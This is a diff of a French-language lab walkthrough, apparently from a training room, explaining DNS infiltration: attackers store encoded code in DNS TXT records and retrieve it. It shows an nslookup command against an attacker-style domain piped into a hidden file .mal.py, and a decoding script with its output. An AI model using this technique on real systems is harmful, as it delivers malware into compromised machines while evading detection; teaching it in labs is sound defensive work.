@@ -18,16 +18,18 @@
 
 - Dans la tâche suivante, nous explorerons comment cela pourrait être réalisé.
 
-### Infiltration DNS : Exemple
+---
 
-introduction
+### Infiltration DNS : Exemple
 
 - Dans ce scénario, l'attaquant va infiltrer un morceau de code « malveillant » sur l'ordinateur de la victime. 
 - Il existe de nombreuses techniques différentes que les attaquants dans le monde réel utilisent pour y parvenir. 
-- Pour simplifier les choses, j'utiliserai un enregistrement TXT configuré sur mon serveur DNS AWS public. La valeur contenue dans cet enregistrement est un code 'malveillant' codé.
+- Pour simplifier les choses, j'utiliserai un enregistrement TXT configuré sur un serveur DNS AWS public. La valeur contenue dans cet enregistrement est un code 'malveillant' encodé.
 
 - Étant donné que les enregistrements TXT sont limités à 255 caractères, les pirates informatiques auront probablement plusieurs enregistrements TXT configurés pour leur serveur DNS. Cela dépend finalement de la longueur de leur code. 
-- Maintenant que tout est configuré et prêt ; tout ce que le pirate informatique doit faire est de demander ces enregistrements TXT, de capturer la ou les valeurs, de les décoder et, les voilà maintenant infiltré leur propre code dans un système compromis via les enregistrements DNS TXT.
+- Maintenant que tout est configuré et prêt, tout ce que le hacker doit faire est de demander ces enregistrements TXT, de capturer la ou les valeurs, de les décoder et, les voilà maintenant infiltré leur propre code dans un système compromis via les enregistrements DNS TXT.
+
+(Cliquez pour agrandir au besoin)
 
 <img src="https://cdn.discordapp.com/attachments/798799811482353734/807297515518427197/infil.png"/>
 
@@ -45,25 +47,28 @@ Cela recherchera d'abord l'enregistrement TXT pour rt1.badbaddoma.in, puis obtie
 `nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py
 `
 
-2. `packetSimple.py` ( https://github.com/kleosdc/dns-exfil-infil )
+2. [packetSimple.py`](https://raw.githubusercontent.com/kleosdc/dns-exfil-infil/main/packetySimple.py)
 
 Lorsque le code vous demande un 'Nom de fichier', entrez le nom de fichier '.mal.py'. C'est le fichier dans lequel nous avons enregistré la valeur encodée.
 
 <img src="https://cdn.discordapp.com/attachments/807129623846584321/807140371967508500/2.PNG"/>
 
 
-`python3 ~/packetySimple.py
+`python3 ~/packetySimple.py. 
 `
-`Filename: .mal.py
+`Filename: .mal.py  
 `
-`[+] Reading from file...
+`[+] Reading from file...  
 `
-`[+] Base58 decoded.
+`[+] Base58 decoded.  
 `
-`[+] Base64 decoded.
+`[+] Base64 decoded.  
 `
-`[+] Done, .mal.py is decoded.
+`[+] Done, .mal.py is decoded.  
 `
+
+---
+
 ### Infiltration DNS : Pratique
 
 - Lisez le fichier TASK qui se trouve dans le dossier `~/challenges/infiltration/`.
